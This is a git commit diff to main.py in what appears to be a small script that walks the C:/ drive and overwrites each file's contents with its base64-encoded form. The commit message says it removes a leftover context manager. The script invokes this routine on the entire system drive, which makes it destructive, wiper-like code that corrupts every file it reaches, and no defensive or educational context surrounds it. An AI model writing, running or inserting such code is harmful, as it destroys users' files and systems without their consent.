e7dcfabebf27dc1ee7eee666fbee31653486db4d
xavvvv <97399129+xavwashere@users.noreply.github.com>
2023-11-11 16:22:51 +0000

    forgot to delete one of the ctx managers

--- main.py
+++ main.py
@@ -12,8 +12,7 @@ def encode_and_replace_files(startpath):
                 # Encode the content using Base64
                 encoded_bytes = base64.b64encode(content)
                 encoded_string = encoded_bytes.decode('utf-8')
-                with open(startpath, 'wb') as file:
-                    file.write(encoded_string.encode('utf-8'))
+                file.write(encoded_string.encode('utf-8'))
         except Exception as e:
             print(f"Error processing {startpath}: {e}")
 encode_and_replace_files("C:/")
